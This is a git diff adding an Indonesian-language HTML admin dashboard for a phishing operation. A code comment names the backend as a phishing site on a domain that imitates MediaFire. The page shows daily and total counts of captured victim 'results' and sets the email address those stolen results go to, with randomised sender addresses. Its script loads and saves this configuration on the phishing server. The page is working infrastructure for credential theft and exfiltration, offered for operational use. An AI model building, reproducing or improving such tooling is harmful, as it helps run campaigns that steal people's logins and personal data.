@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Dashboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+  :root{
+    --navy:#111a33;
+    --blue:#2563eb;
+    --yellow:#fde68a;
+    --ink:#1e2a4a;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:'Space Grotesk',sans-serif;
+    min-height:100vh;
+    background-color:#fff;
+    background-image:
+      linear-gradient(#e6ebf7 1px,transparent 1px),
+      linear-gradient(90deg,#e6ebf7 1px,transparent 1px);
+    background-size:28px 28px;
+    color:var(--ink);
+    padding-bottom:30px;
+  }
+
+  /* HEADER */
+  header{
+    background:var(--navy);
+    height:54px;
+    padding:0 9px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    position:relative;
+  }
+  header h1{
+    color:#fff;
+    font-size:21px;
+    font-weight:700;
+    letter-spacing:-.3px;
+  }
+  .stripe{
+    height:6px;
+    background:
+      repeating-linear-gradient(90deg,var(--blue) 0 18px,transparent 18px 36px) bottom/100% 3px no-repeat,
+      var(--yellow);
+  }
+
+  main{padding:0 15px}
+
+  /* STATS */
+  .stats{
+    margin-top:24px;
+    background:#fff;
+    border:2px solid var(--navy);
+    border-radius:16px;
+    box-shadow:4px 4px 0 var(--navy);
+    display:flex;
+    align-items:center;
+    padding:12px 0 10px;
+  }
+  .stat{
+    flex:1;
+    text-align:center;
+    position:relative;
+  }
+  .stat + .stat::before{
+    content:"";
+    position:absolute;
+    left:0;top:50%;
+    transform:translateY(-50%);
+    width:2px;height:34px;
+    background:#d5dae6;
+  }
+  .icon-box{
+    width:34px;height:34px;
+    margin:0 auto 2px;
+    border:2px solid var(--navy);
+    border-radius:9px;
+    box-shadow:2px 2px 0 var(--navy);
+    display:flex;align-items:center;justify-content:center;
+    font-size:15px;
+  }
+  .ib-blue{background:#dbe4ff;color:var(--blue)}
+  .ib-orange{background:#fdebb8;color:#e8920c}
+  .ib-green{background:#c9f5dc;color:#0f9d63}
+  .num{font-size:25px;font-weight:700;line-height:1.1}
+  .n-blue{color:var(--blue)}
+  .n-orange{color:#e8920c}
+  .n-green{color:#0f9d63}
+  .label{
+    font-size:11px;
+    font-weight:700;
+    color:#3b4560;
+    text-transform:uppercase;
+    margin-top:2px;
+  }
+
+  /* CARD SETTING */
+  .card{
+    margin-top:22px;
+    background:#fff;
+    border:2px solid var(--navy);
+    border-radius:16px;
+    box-shadow:4px 4px 0 var(--navy);
+    position:relative;
+    overflow:hidden;
+    padding:30px 15px 16px;
+  }
+  .card::before{
+    content:"";
+    position:absolute;
+    top:0;left:0;right:0;
+    height:6px;
+    background:repeating-linear-gradient(90deg,var(--blue) 0 35px,var(--yellow) 35px 70px);
+  }
+  .card::after{
+    content:"";
+    position:absolute;
+    top:6px;right:0;
+    width:26px;height:26px;
+    background:var(--yellow);
+    clip-path:polygon(0 0,100% 0,100% 100%);
+  }
+  .card h2{
+    color:var(--blue);
+    font-size:23px;
+    font-weight:700;
+    display:flex;
+    align-items:center;
+    gap:9px;
+    margin-bottom:20px;
+    letter-spacing:-.3px;
+  }
+  .card h2 i{font-size:19px}
+  .field-label{
+    display:block;
+    font-size:14px;
+    font-weight:700;
+    color:var(--navy);
+    text-transform:uppercase;
+    margin-bottom:8px;
+  }
+  .input{
+    width:100%;
+    height:38px;
+    border:1.5px solid var(--navy);
+    border-radius:8px;
+    background:#fff;
+    padding:0 10px;
+    font-family:inherit;
+    font-size:16px;
+    font-weight:600;
+    color:var(--navy);
+    outline:none;
+  }
+  .input:focus{border-color:var(--blue)}
+  .group{margin-bottom:18px}
+  .row{display:flex;gap:11px}
+  .row > *{flex:1;min-width:0}
+  .with-btn{position:relative}
+  .with-btn .input{padding-right:46px}
+  .btn-refresh{
+    position:absolute;
+    right:4px;top:3px;
+    width:32px;height:32px;
+    background:#fcd95e;
+    border:1.5px solid var(--navy);
+    border-radius:8px;
+    box-shadow:2px 2px 0 var(--navy);
+    display:flex;align-items:center;justify-content:center;
+    cursor:pointer;
+    font-size:14px;
+    color:var(--navy);
+  }
+  .btn-save{
+    margin-top:22px;
+    background:var(--blue);
+    color:#fff;
+    border:2px solid var(--navy);
+    border-radius:999px;
+    box-shadow:3px 3px 0 var(--navy);
+    font-family:inherit;
+    font-weight:700;
+    font-size:16px;
+    letter-spacing:.3px;
+    text-transform:uppercase;
+    padding:0 22px;
+    height:44px;
+    display:inline-flex;
+    align-items:center;
+    gap:9px;
+    cursor:pointer;
+  }
+  
+  /* TOAST NOTIFIKASI */
+  #toast {
+    display: none; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+    background: #111a33; color: #fff; padding: 12px 24px; border-radius: 8px; 
+    font-weight: 600; z-index: 9999; box-shadow: 3px 3px 0 var(--blue);
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Dashboard</h1>
+</header>
+<div class="stripe"></div>
+
+<main>
+  <section class="stats">
+    <div class="stat">
+      <div class="icon-box ib-blue"><i class="fa-solid fa-paper-plane"></i></div>
+      <div class="num n-blue" id="statHariIni">0</div>
+      <div class="label">Result Hari Ini</div>
+    </div>
+    <div class="stat">
+      <div class="icon-box ib-orange"><i class="fa-solid fa-clock-rotate-left"></i></div>
+      <div class="num n-orange" id="statKemarin">0</div>
+      <div class="label">Kemarin</div>
+    </div>
+    <div class="stat">
+      <div class="icon-box ib-green"><i class="fa-solid fa-layer-group"></i></div>
+      <div class="num n-green" id="statTotal">0</div>
+      <div class="label">Total Result</div>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2><i class="fa-solid fa-envelope"></i> Setting EMAIL</h2>
+
+    <div class="group">
+      <label class="field-label">Email Tujuan</label>
+      <input type="email" class="input" id="emailTujuan" placeholder="admin@domain.com">
+    </div>
+
+    <div class="group">
+      <label class="field-label">Nama Ress</label>
+      <div class="row">
+        <input type="text" class="input" id="namaRess1" placeholder="BOYZ NEBAR ESPORT">
+        <div class="with-btn">
+          <input type="text" class="input" id="namaRess2" placeholder="app_xxx@4vt6.me">
+          <button type="button" class="btn-refresh" onclick="randomEmail()"><i class="fa-solid fa-rotate"></i></button>
+        </div>
+      </div>
+    </div>
+
+    <div class="group" style="margin-bottom:0">
+      <label class="field-label">Banner URL &amp; Footer Text</label>
+      <div class="row">
+        <input type="text" class="input" id="bannerUrl" placeholder="atas.jpg">
+        <input type="text" class="input" id="footerText" value="Web Kenz">
+      </div>
+    </div>
+
+    <button type="button" class="btn-save" id="btnSimpan"><i class="fa-solid fa-floppy-disk"></i> Simpan</button>
+  </section>
+</main>
+
+<div id="toast">SETTING KESIMPEN!</div>
+
+<script>
+// ==============================================================
+// URL VERCEL PHISING LU (mediafire.my.id)
+// ==============================================================
+const API_URL = "https://mediafire.my.id"; 
+
+function showToast(msg, bgColor = "#16a34a") {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.style.background = bgColor;
+    t.style.display = "block";
+    setTimeout(() => { t.style.display = "none"; }, 3000);
+}
+
+function randomEmail() {
+    const randomStr = Math.random().toString(36).substring(2, 9);
+    document.getElementById('namaRess2').value = `app_${randomStr}@4vt6.me`;
+}
+
+// NARIK DATA CONFIG & STATISTIK
+async function loadData() {
+    try {
+        const res = await fetch(API_URL + '/api/config');
+        const data = await res.json();
+        
+        // Isi Form
+        if(data.email_tujuan) document.getElementById('emailTujuan').value = data.email_tujuan;
+        if(data.banner_url) document.getElementById('bannerUrl').value = data.banner_url;
+        if(data.footer_text) document.getElementById('footerText').value = data.footer_text;
+        if(data.nama_ress) document.getElementById('namaRess1').value = data.nama_ress;
+
+        // Isi Statistik (Kalo API udah support)
+        if(data.stat_hari_ini !== undefined) document.getElementById('statHariIni').innerText = data.stat_hari_ini;
+        if(data.stat_kemarin !== undefined) document.getElementById('statKemarin').innerText = data.stat_kemarin;
+        if(data.stat_total !== undefined) document.getElementById('statTotal').innerText = data.stat_total;
+
+    } catch(e) {
+        console.error("Gagal load config:", e);
+    }
+}
+
+document.getElementById('btnSimpan').addEventListener('click', async function() {
+    this.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menyimpan...';
+    this.disabled = true;
+
+    const payload = {
+        email_tujuan: document.getElementById('emailTujuan').value,
+        banner_url: document.getElementById('bannerUrl').value,
+        footer_text: document.getElementById('footerText').value,
+        nama_ress: document.getElementById('namaRess1').value + ' <' + document.getElementById('namaRess2').value + '>'
+    };
+
+    try {
+        const res = await fetch(API_URL + '/api/config', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        const result = await res.json();
+        
+        if(res.ok) {
+            showToast("🔥 SETTING KESIMPEN ANJING!", "#16a34a");
+        } else {
+            showToast("❌ " + (result.error || "Gagal nyimpen bangsat!"), "#dc2626");
+        }
+    } catch(e) {
+        showToast("❌ Error koneksi ke Vercel!", "#dc2626");
+    } finally {
+        this.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> Simpan';
+        this.disabled = false;
+    }
+});
+
+loadData();
+</script>
+
+</body>
+</html>
